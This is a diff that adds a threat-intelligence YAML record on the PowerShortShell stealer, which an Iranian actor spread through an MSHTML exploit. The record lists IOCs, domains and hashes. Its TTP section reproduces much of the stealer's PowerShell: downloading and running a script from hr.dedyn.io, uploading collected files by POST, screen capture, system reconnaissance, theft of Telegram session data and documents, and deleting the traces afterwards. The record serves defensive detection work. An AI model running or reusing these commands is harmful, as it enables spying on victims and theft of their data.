@@ -1,0 +1,138 @@
+description: Iranian threat actor used a Microsoft MSHTML Remote Code Execution exploit
+  to infect victims with PowerShortShell PowerShell stealer.
+attribution: Iranian threat actor
+malware_families:
+- PowerShortShell
+TTPs:
+  processes:
+  - powershell.exe
+  - rundll32
+  commandline:
+  - powershell.exe -windowstyle hidden (new-object system.Net.WebClient).DownloadFile(http://hr.dedyn.io/1.ps1,
+    C:/windows/temp/1.ps1)
+  - powershell.exe -windowstyle hidden -ExecutionPolicy Unrestricted -File C:/windows/temp/1.ps1
+  - .cpl:../../../../../Temp/Low/msword.inf
+  powershell:
+  - Remove-Item path C:\Windows\Temp\1.ps1
+  - Add-Type -assembly system.io.compression.filesystem
+  - function Pos-Da($dest,$url){try{$buffer = [System.IO.File]::ReadAllBytes($dest)[System.Net.HttpWebRequest]
+    $webRequest = [System.Net.WebRequest]::Create($url)$webRequest.Timeout =10000000$webRequest.Method
+    = POST$webRequest.ContentType = application/data$requestStream = $webRequest.GetRequestStream()$requestStream.Write($buffer,
+    0, $buffer.Length)$requestStream.Flush()$requestStream.Close()[System.Net.HttpWebResponse]
+    $webResponse = $webRequest.GetResponse()$streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())$result
+    = $streamReader.ReadToEnd()$streamReader.Close()}catch{Write-Error $_.Exception.Message
+    | out-file $log -Append}}
+  - function Get-ScreenCapture{param([Switch]$OfWindow)begin {Add-Type -AssemblyName
+    System.Drawing$jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()
+    |Where-Object { $_.FormatDescription -eq JPEG }}process {Start-Sleep -Milliseconds
+    250if ($OfWindow) {[Windows.Forms.Sendkeys]::SendWait(%{PrtSc})} else {[Windows.Forms.Sendkeys]::SendWait({PrtSc})}Start-Sleep
+    -Milliseconds 250$bitmap = [Windows.Forms.Clipboard]::GetImage()$ep = New-Object
+    Drawing.Imaging.EncoderParameters$ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter
+    ([System.Drawing.Imaging.Encoder]::Quality, [long]100)$screenCapturePathBase =
+    $source\ScreenCapture$c = 0while (Test-Path ${screenCapturePathBase}${c}.jpg)
+    {$c++}$bitmap.Save(${screenCapturePathBase}${c}.jpg, $jpegCodec, $ep)}}
+  - New-Item -ItemType directory -Path $source
+  - Get-WmiObject -class win32_computersystem | Out-File $source\summary.txt
+  - Get-WmiObject Win32_BIOS -computerName localhost | Out-File $source\bios.txt;
+  - Get-WmiObject -Class win32_PhysicalMemory -namespace root\CIMV2 | Out-File $source\ram.txt;
+  - '@(Get-WmiObject -class win32_processor | Select Caption, Description, NumberOfCores,
+    NumberOfLogicalProcessors, Name, Manufacturer, SystemCreationClassName, Version)
+    | Out-File $source\cpu.txt;'
+  - gwmi Win32NetworkAdapterConfiguration | Where { $.IPAddress } | Select -Expand
+    IPAddress | Out-File $source\ip.txt;
+  - gwmi Win32_NetworkAdapterConfiguration | Out-File $source\NetworkAdapterConfig.txt;
+  - get-WmiObject win32_logicaldisk | Out-File $source\disk.txt;
+  - Get-Process | Out-File -filepath $source\process.txt;
+  - Get-NetAdapter | Out-File $source\NetworkAdapter.txt;
+  - '#net view | Out-File $source\NetView.txt;'
+  - Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
+    | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table
+    AutoSize | Out-File $source\apps.txt;
+  - ipconfig /all | Out-File $source\ipConfig.txt;
+  - netstat -ano | Out-File $source\netstat.txt;
+  - arp -a -v | Out-File $source\arp.txt;
+  - net user | Out-File $source\netuser.txt;
+  - Get-CimInstance Win32_OperatingSystem | FL * | Out-File $source\os.txt;
+  - Get-ExecutionPolicy -List | Out-File $source\policy.txt;
+  - Get-Service | Out-File $source\service.txt;
+  - Get-ScreenCapture
+  - $files = Get-ChildItem $sourceforeach ($file in $files){Pos-Da -dest $file.FullName
+    -url $destination+$file}
+  - $path= Split-Path -Path (Get-WMIObject Win32LogicalDisk -filter DriveType = 3
+    | Select-Object DeviceID | ForEach-Object {Get-Childitem ($.DeviceID + \) -Attributes
+    !Directory,!Directory+Hidden -include Telegram.exe -recurse})
+  - $index=0foreach ($a in $path){try{$tempDwn=C:\windows\temp\tdata{0} -f $indexNew-Item
+    -ItemType Directory -Force -Path $tempDwn\D877F783D5D3EF8C$source= $a+\tdata\D877F783D5D3EF8Cif(Test-Path
+    -Path $source){$d8files=Get-ChildItem -Path $source | Where-Object {$_.Name.Contains(map)}
+    | select FullName, Nameforeach($d8 in $d8files){$mtemp={0}\D877F783D5D3EF8C\{1}
+    -f $tempDwn, $d8.NameCopy-Item $d8.FullName -Destination $mtemp}else {continue}$tempFiles=Get-ChildItem
+    -Path $a\tdata | Where-Object {$_.PSIsContainer -eq $false} | select FullName,
+    Nameforeach ($file in $tempFiles){try{$destTemp={0}\{1} -f $tempDwn, $file.NameCopy-Item
+    $file.FullName -Destination $destTemp}Catch{}}echo $tempDwn$dest=C:\windows\temp\tdata{0}.zip
+    -f $index[io.compression.zipfile]::CreateFromDirectory($tempDwn, $dest)Start-Sleep
+    -s 15Pos-Da -dest $dest -url $destination2}catch{Write-Error $_.Exception.Message
+    | out-file $log -Append}$index++Start-Sleep -s 15Remove-Item path $destRemove-Item
+    path $tempDwn -Recurse}
+  - $files = (Get-WMIObject Win32LogicalDisk -filter DriveType = 3 | Select-Object
+    DeviceID | ForEach-Object {Get-Childitem ($.DeviceID + \) -include .doc,.docx,.pptx,.pdf,.txt,.xls,.xlsx,.bak,.db,.mdb,*.accdb
+    -recurse})foreach ($file in $files){$destUrl={0}{1} -f $destination, $file.NamePos-Da
+    -dest $file.FullName -url $destUrlStart-Sleep -s 5}
+  - Remove-Item path $source -Recurse
+  - Remove-Item -path $log
+  scripting_engine:
+  - JScript
+  registry_keys:
+  - HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*
+  image_load:
+  - msword.inf.dll
+  network_connections:
+  - powershell.exe, hr.dedyn.io, 80
+  - rundll32, hr.dedyn.io, 80
+  - PowerShortShell, hr.dedyn.io, 80
+  - PowerShortShell, hr.dedyn.io, 443
+  file_activity:
+  - C:/windows/temp/1.ps1
+  - C:\Windows\Temp\1.ps1
+  - C:\\windows\\temp\\8f720a5db6c7
+  - https://hr.dedyn.io/upload.aspx?fn=
+  - https://hr.dedyn.io/upload2.aspx
+  - c:\\windows\\temp\\777.log
+  persistence: []
+  process_relations:
+  - rundll32 -> msword.inf.dll
+  - msword.inf.dll -> powershell.exe
+CVEs:
+- CVE-2021-40444
+IOCs:
+  hashes:
+  - F69595FD06582FE1426D403844696410904D27E7624F0DCF65D6EA57E0265168
+  - Ce962676090195a5f829e7baf013a3213b3b32e27c9631dc932aab2ce46a6b9b
+  - Msword.inf 5d7a683a6231a4dc0fcc71c4b6d413c6655c7a0e5c58452d321614954d7030d3
+  - E093cce6a4066aa37ed68121fe1464a3e130a3ce0fbb89e8b13651fd7dab842b
+  - Jscript 6e730b257c3e0c5ce6c73ff0f6732ad2d09f000b423085303a928e665dbbee16
+  - Word.html,image.html,index.html 374239d2056a8a20b05d4bf4431a852af330f2675158afde8de71ac5b991e273
+  - B378a1136fddcd533cbdf7473175bf5d34f5eb86436b8eb651435eb3a27a87c611368964
+  - D768D7FA4AB48100B231790C3D23C45EEDFC7A73ACD7F3FEC703ACA7 28ad066cfe08fcce77974ef469c32e4d2a762e50d6b95b8569e34199d679bde8
+  - 5AC4574929A8825A5D4F267544C33D02919AB38F38F21CE5C9389B67DF241B43
+  - D793193c2d0c31bC23639725b097a6a0ffbe9f60a46eabfe0128e006f0492a08
+  - Mozdor.docx 0b90ef87dbbb9e6e4a5e5027116d4d7c4bc2824a491292263eb8a7bda8afb7bd
+  ip_addresses:
+  - 95.217.50.126
+  domains:
+  - hr.dedyn.io
+  - signin.dedyn.io
+  - Irkodex.dedyn.io
+  - Deltaban.dedyn.io
+  urls:
+  - http://hr.dedyn.io/image.html
+  - http://hr.dedyn.io/word.html
+  - http://hr.dedyn.io/word.cab
+  - https://hr.dedyn.io/upload.aspx?fn=
+  - https://hr.dedyn.io/upload2.aspx
+  - https://signin.dedyn.io/Social/GoogleFinish._
+  - https://signin.dedyn.io/Social/Instagram/Account
+authors:
+- Tomer Bar
+reference: https://www.safebreach.com/blog/new-powershortshell-stealer-exploits-recent-microsoft-mshtml-vulnerability-to-spy-on-farsi-speakers
+date_of_publication: March 04, 2026
+file_creation_date: March 04, 2026
